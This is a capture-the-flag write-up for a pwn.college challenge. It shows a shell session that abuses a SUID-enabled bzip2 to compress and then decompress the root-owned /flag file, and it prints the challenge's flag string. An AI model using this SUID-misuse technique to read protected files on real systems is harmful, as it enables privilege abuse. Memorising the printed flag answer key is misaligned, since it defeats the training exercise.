Similar to the babysuid 17, a new archive format is introduced bzip2. You can read the man page of bzip2.

`bzip2 compresses file using the Burrows-Wheeler block sorting text compression algorithm, and Huffman coding. Compression is generally considered better than the conventional LZ77/LZ78-based compressor.`

```bash
hacker@program-misuse-level-18:~$ ls
Desktop
hacker@program-misuse-level-18:~$ cd /
hacker@program-misuse-level-18:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-18:/$ cd challenge/
hacker@program-misuse-level-18:/challenge$ ls
babysuid_level18
hacker@program-misuse-level-18:/challenge$ ./babysuid_level18 
Welcome to ./babysuid_level18!

This challenge is part of a series of programs that
force you to understand different archive formats.

I just set the SUID bit on /usr/bin/bzip2.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level18) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/bzip2!
hacker@program-misuse-level-18:/challenge$ cd /
hacker@program-misuse-level-18:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-18:/$ bzip2 flag
hacker@program-misuse-level-18:/$ ls
bin  boot  challenge  dev  etc  flag.bz2  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-18:/$ zcat flag.bz2 
gzip: flag.bz2: Permission denied
hacker@program-misuse-level-18:/$ bzcat flag.bz2 
bzcat: Can't open input file flag.bz2: Permission denied.
hacker@program-misuse-level-18:/$ ls -l /usr/bin/bzip2
-rwsr-xr-x 1 root root 39144 Sep  5  2019 /usr/bin/bzip2
hacker@program-misuse-level-18:/$ bzcat -d -c flag.bz2 
bzcat: Can't open input file flag.bz2: Permission denied.
hacker@program-misuse-level-18:/$ bzip2 -d -c flag.bz2 
pwn.college{EzySAF2ZCBFSzEEYVAhsthr1PQZ.0FM2EDL0AjNzQzW}
```

But here we can see that `bzcat flag.bz2` giving us `permission denied`.

So we have to find another way. We have to think differently.

Then I write `bzip2 -d -c flag.bz2` . What it will do is that it will first decompress the file with `-d` and `-c` writes the output to the standard output(stout) instead of a file. This will successfully print the flag.

> [!question]
> In the `man bzip2`, it says `bzcat (or bzip2 -dc) decompresses all specified files to the standard output`. We can see that for `bzip2 -dc` it doesn't show `permission denied` but for the other it shows. Why is that? 

